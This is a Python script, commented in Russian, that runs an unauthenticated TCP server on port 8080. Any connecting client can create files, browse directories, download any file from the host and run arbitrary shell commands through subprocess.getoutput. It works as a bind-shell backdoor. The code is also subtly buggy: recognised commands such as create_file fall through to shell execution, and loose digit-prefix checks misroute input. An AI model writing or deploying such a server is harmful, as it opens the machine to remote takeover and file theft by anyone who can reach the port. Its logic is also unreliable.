import socket
import subprocess
import os


# Настройки сервера
HOST = '0.0.0.0'  # Слушать все адреса
PORT = 8080       # Порт для подключения

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"Сервер запущен. Ожидание подключения на порту {PORT}...")

conn, addr = server_socket.accept()
print(f"Подключение от: {addr}")

current_dir = os.getcwd()  # Текущая директория сервера

while True:
    try:
        # Получение команды
        command = conn.recv(1024).decode("utf-8").strip()
        if command.lower() == 'exit' or command.startswith("0"):
            print("Закрытие соединения.")
            break

        if command.startswith("create_file") or command.startswith("1"):
            # Создать файл на рабочем столе
            _, message, file_name = command.split(maxsplit = 2)
            print(f"'_' = {_}, file_name = {file_name}")
            file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{file_name}.txt")
            with open(file_path, "w") as f:
                f.write(message)
            conn.send(f"Файл создан: {file_path}".encode("utf-8"))

        elif command.startswith("open_calculator") or command.startswith("2"):
            # Открыть калькулятор
            if os.name == "nt":  # Windows
                subprocess.Popen("calc.exe")
            elif os.name == "posix":  # Linux/Mac
                subprocess.Popen(["gnome-calculator"])
            conn.send("Калькулятор запущен.".encode("utf-8"))

        
        # Просмотр текущей директории
        if command == "list_dir" or command.startswith("3"):
            files = os.listdir(current_dir)
            conn.send("\n".join(files).encode("utf-8"))

        # Перемещение в другую директорию
        elif command.startswith("change_dir") or command.startswith("4"):
            _, path = command.split(maxsplit=1)
            new_dir = os.path.join(current_dir, path)
            if os.path.isdir(new_dir):
                current_dir = new_dir
                conn.send(f"Текущая директория: {current_dir}".encode("utf-8"))
            else:
                conn.send("Ошибка: Указанная директория не существует.".encode("utf-8"))

        # Получение текущей директории
        elif command == "get_cwd" or command.startswith("5"):
            conn.send(current_dir.encode("utf-8"))

        # Передача файла клиенту
        elif command.startswith("get_file") or command.startswith("6"):
            _, file_name = command.split(maxsplit=1)
            file_path = os.path.join(current_dir, file_name)
            if os.path.isfile(file_path):
                conn.send(b"FILE_TRANSFER_START")
                with open(file_path, "rb") as file:
                    data = file.read()
                    conn.sendall(data)
                conn.send(b"FILE_TRANSFER_END")
            else:
                conn.send("Ошибка: Файл не найден.".encode("utf-8"))

       

        else:
            # Выполнение произвольной команды
            output = subprocess.getoutput(command)
            conn.send(output.encode("utf-8"))

    except Exception as e:
        conn.send(f"Ошибка: {e}".encode("utf-8"))

conn.close()
server_socket.close()


